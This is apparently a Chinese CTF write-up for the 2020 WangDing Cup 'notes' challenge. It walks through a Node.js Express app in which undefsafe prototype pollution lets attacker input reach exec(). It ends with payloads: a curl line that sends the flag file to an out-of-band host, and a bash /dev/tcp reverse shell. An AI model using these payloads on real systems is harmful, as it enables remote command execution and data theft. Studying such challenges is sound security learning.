---
title: 网鼎杯2020青龙组-notes
date: 2025-05-30 19:32:19
tags:
- js原型链污染
- curl外带数据
- 反弹shell
category:
- 刷题笔记
---

# 网鼎杯2020青龙组-notes

参考博客：https://blog.csdn.net/2401_86190146/article/details/145328235

源码：

```
var express = require('express');
var path = require('path');
const undefsafe = require('undefsafe');
const { exec } = require('child_process');
 
 
var app = express();
class Notes {
    constructor() {
        this.owner = "whoknows";
        this.num = 0;
        this.note_list = {};
    }
 
    write_note(author, raw_note) {
        this.note_list[(this.num++).toString()] = {"author": author,"raw_note":raw_note};
    }
 
    get_note(id) {
        var r = {}
        undefsafe(r, id, undefsafe(this.note_list, id));
        return r;
    }
 
    edit_note(id, author, raw) {
        undefsafe(this.note_list, id + '.author', author);
        undefsafe(this.note_list, id + '.raw_note', raw);
    }
 
    get_all_notes() {
        return this.note_list;
    }
 
    remove_note(id) {
        delete this.note_list[id];
    }
}
 
var notes = new Notes();
notes.write_note("nobody", "this is nobody's first note");
 
 
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');
 
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));
 
 
app.get('/', function(req, res, next) {
  res.render('index', { title: 'Notebook' });
});
 
app.route('/add_note')
    .get(function(req, res) {
        res.render('mess', {message: 'please use POST to add a note'});
    })
    .post(function(req, res) {
        let author = req.body.author;
        let raw = req.body.raw;
        if (author && raw) {
            notes.write_note(author, raw);
            res.render('mess', {message: "add note sucess"});
        } else {
            res.render('mess', {message: "did not add note"});
        }
    })
 
app.route('/edit_note')
    .get(function(req, res) {
        res.render('mess', {message: "please use POST to edit a note"});
    })
    .post(function(req, res) {
        let id = req.body.id;
        let author = req.body.author;
        let enote = req.body.raw;
        if (id && author && enote) {
            notes.edit_note(id, author, enote);
            res.render('mess', {message: "edit note sucess"});
        } else {
            res.render('mess', {message: "edit note failed"});
        }
    })
 
app.route('/delete_note')
    .get(function(req, res) {
        res.render('mess', {message: "please use POST to delete a note"});
    })
    .post(function(req, res) {
        let id = req.body.id;
        if (id) {
            notes.remove_note(id);
            res.render('mess', {message: "delete done"});
        } else {
            res.render('mess', {message: "delete failed"});
        }
    })
 
app.route('/notes')
    .get(function(req, res) {
        let q = req.query.q;
        let a_note;
        if (typeof(q) === "undefined") {
            a_note = notes.get_all_notes();
        } else {
            a_note = notes.get_note(q);
        }
        res.render('note', {list: a_note});
    })
 
app.route('/status')
    .get(function(req, res) {
        let commands = {
            "script-1": "uptime",
            "script-2": "free -m"
        };
        for (let index in commands) {
            exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {
                if (err) {
                    return;
                }
                console.log(`stdout: ${stdout}`);
            });
        }
        res.send('OK');
        res.end();
    })
 
 
app.use(function(req, res, next) {
  res.status(404).send('Sorry cant find that!');
});
 
 
app.use(function(err, req, res, next) {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});
 
 
const port = 8080;
app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))
```

## 代码审计

**1.关于require的两个模块：**

**express：这是一个广受欢迎的 Node.js Web 应用框架，可用来构建 Web 应用与 API。**

**path：它属于 Node.js 的内置模块，能处理和转换文件路径。**

---

**2.在const { exec } = require('child_process');中**

**child_process 模块里的 exec 函数：在子进程中执行外部命令**。

---

**3..toString()：主要功能是将对象转换为字符串形式**

**例如当num=10时，console.log(num.toString(x))输出10的x进制的字符串**

---

**4.var app = express(); 用于创建一个Express实例**

---

**5.对于 /status 模块**

```
app.route('/status')
    .get(function(req, res) {
        let commands = {
            "script-1": "uptime",
            "script-2": "free -m"
        };
        for (let index in commands) {
            exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {
                if (err) {
                    return;
                }
                console.log(`stdout: ${stdout}`);
            });
        }
        res.send('OK');
        res.end();
    })
```

 **exec()是child_process 模块中的一个函数，用于在子进程中执行 shell 命令。**

{shell: '/bin/bash'} 是一个配置对象，指定使用 /bin/bash 作为执行命令的 shell。

**shell 是一个属性，'/bin/bash' 是该属性的值，这个配置的作用是指定在执行子进程中的命令时，使用 /bin/bash （也就是shell）作为 shell 程序。**
**(err, stdout, stderr) => {...} 是一个回调函数，当命令执行完成后会被调用。**

**err：如果命令执行过程中出现错误，err 会包含错误信息；如果执行成功，err 为 null。**
**stdout：包含命令执行后的标准输出内容。**
**stderr：包含命令执行后的标准错误输出内容。**
**res.send('OK') 方法将字符串 "OK" 作为响应内容发送给客户端。**
**res.end() 方法用于结束响应流，表明已经没有更多的数据要发送给客户端。**

## 漏洞

```
  edit_note(id, author, raw) {
        undefsafe(this.note_list, id + '.author', author);
        undefsafe(this.note_list, id + '.raw_note', raw);
    }
```

而note_list的创建为：

说明note_list的原型为Object

发现此处可以利用原型链污染，只要将id的值设为`"__proto__"`，就会连接成 `"proto.author"` ， 也就是设置了note_list原型Object的author属性为我们上传的author内容

在status模块中，发现exec()可以执行任意命令行命令，是一个突破口

for循环除了遍历commands上的属性，还会向它的原型Object找可枚举属性，找到被污染的author属性，放入exec()执行我们输入的命令

```
for…in 循环只遍历可枚举属性（包括它的原型链上的可枚举属性）。像 Array和 Object使用内置构造函数所创建的对象都会继承自Object.prototype和String.prototype的不可枚举属性，例如 String 的 indexOf() 方法或 Object的toString()方法。循环将遍历对象本身的所有可枚举属性，以及对象从其构造函数原型中继承的属性（更接近原型链中对象的属性覆盖原型属性）
```

payload：

在edit_notes处提交

curl外带

```
id=__proto__.bb&author=curl hi313hvjrt7vdw7jlrly8fa28tek2aqz.oastify.com?1=`cat /flag`&raw=a
```

或者反弹shell

```
id=__proto__&author=bash -i >& /dev/tcp/vps/端口号 0>&1&raw=a
```





